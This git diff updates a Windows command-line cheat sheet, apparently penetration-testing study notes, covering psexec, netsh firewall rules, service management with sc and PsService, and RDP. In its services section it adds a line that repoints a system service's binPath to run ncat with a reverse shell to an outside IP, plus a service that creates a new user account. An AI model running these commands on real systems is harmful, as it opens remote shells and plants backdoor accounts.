@@ -43,9 +43,9 @@ Read and write environment variables
 * /m **system environment**
 * /k assign var with REG KEY
 
-Search environment variable starting with the letter u.
+Search environment variable starting with the letter k.
 
-`set u`
+`set k`
 
 ```
 echo %USERNAME%
@@ -166,7 +166,7 @@ client> socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe’
 
 * -i \computer
 * -i \\IP-addr
-* -u user
+* -u domain\user
 * -p password
 * -s super user nt authority
 * cmd /c <command>
@@ -175,9 +175,152 @@ https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 
 ```
 psexec -i \myComputer cmd /c "systeminfo"
-psexec -i \myComputer -u username -p password cmd
-psexec -i \myComputer -u username -p password cmd /c "systeminfo"
+psexec -i \myComputer -u domain\username -p password cmd
+psexec -i \myComputer -u domain\username -p password cmd /c "systeminfo"
 psexec.exe -i \\192.168.54.100 -u administrator -p remoteadmin cmd
-psexec.exe -i \\192.168.54.100 -u admin -p password cmd /c "type c:\Users\admin\Desktop\psexec-flag1.txt"
-psexec.exe -i -s \\192.168.54.100 -u admin -p password cmd /c "type c:\Users\admin\Desktop\file.txt"
+
+psexec.exe -i \\IP -u user -p password cmd /c "type c:\Users\user\Desktop\file.txt"
+psexec.exe -i -s \\IP -u admin -p password cmd /c "type c:\Users\admin\Desktop\file.txt"
+```
+
+Unzip files
+
+```
+tar -vxf file.zip
+psexec.exe -i \\IP -u user -p password cmd /c "tar -vxf file.zip"
+```
+
+## Windows Defender Firewall
+
+The netsh command line utility allows to view and manipulate network configuration including local and remote computers.
+
+* -r remote computer
+* -u domain\user
+* -p password
+* -f script file
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754516(v=ws.10)
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd734783(v=ws.10)
+AdvFirewall commands - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10)
+
+Reset the firewall
+
+```
+netsh firewall ?
+netsh advfirewall ?
+netsh advfirewall reset
+%systemroot%\system32\LogFiles\Firewall\pfirewall.log
+```
+
+Show all profiles and activate firewall
+
+* allprofiles
+* currentprofile
+* domainprofile
+* privateprofile
+* publicprofile
+
+```
+netsh advfirewall show allprofiles
+netsh advfirewall show allprofile state
+netsh advfirewall set allprofiles state on
+
+```
+
+Add rules to firewall
+
+```
+netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
+netsh advfirewall firewall show rule name="Deny Ping OffSec"
+netsh advfirewall firewall delete rule name="Deny Ping OffSec"
+netsh advfirewall firewall add rule name="Block OffSec Website" remoteip=192.124.249.5 dir=out enable=yes action=block remoteport=443 protocol=tcp
+netsh advfirewall firewall add rule name="Allow SSH" dir=in action="allow" localport=22 protocol=tcp
+```
+
+Export and import firewall policies
+
+```
+netsh advfirewall export c:\fwPolicy.wfw
+netsh advfirewall reset
+netsh advfirewall import c:\fwPolicy.wfw
+```
+
+## Windows Services
+
+A windows service is a program that usually runs in the background. They can also run with different permissions, as an unprivileged user, or as SYSTEM. Generally, services run as non-interactive, but we can enable and disable them. 
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)
+
+Start/Stop and query services status info
+
+```
+net stop WSearch
+net start WSearch
+new view WSearch
+
+sc start WSearch
+sc stop WSearch
+sc query WSearch
+sc description WSearch
+sc getdisplayname WSearch
+```
+
+Show services information 
+
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist
+https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
+
+* tasklist /svc services
+* sc query service state info
+* sc qc service config like autostart, path name and dependencies
+* PsService can be access remote systems, while sc only works locally
+  * psservice \\computer
+  * -u domain\user
+  * -p password
+  * start/stop/query/config
+
+```
+tasklist /svc
+tasklist /svc | find "Dhcp"
+
+sc query Dhcp  
+sc qc Dhcp
+PsService.exe start WSearch
+PsService.exe stop WSearch
+PsService.exe query WSearch
+PsService.exe config WSearch
+PsService setconfig "SNMPTRAP" auto/disabled
+```
+
+Interact with services and create new ones
+
+```
+sc config Dhcp start=auto
+sc config Dhcp start=disabled
+sc config Dhcp binPath= "ncat.exe 192.168.1.1 4444 -e cmd.exe"
+sc config test binPath= "net user somebody /add"
+sc start test
+```
+
+## Remote Desktop
+
+Allow remote desktop connection from windows and linux.
+
+https://en.wikipedia.org/wiki/Remote_Desktop_Protocol
+
+* RDP uses TCP port 3389
+
+```
+rdesktop -u offensive -p security 192.168.192.64
+```
+
+Get Hostnames
+
+```
+
+nslookup IP
+nbtstat -A IP
+nmap -v -A IP
+psexec -accepteula
+psexec -i \\192.168.20.20 hostname
 ```
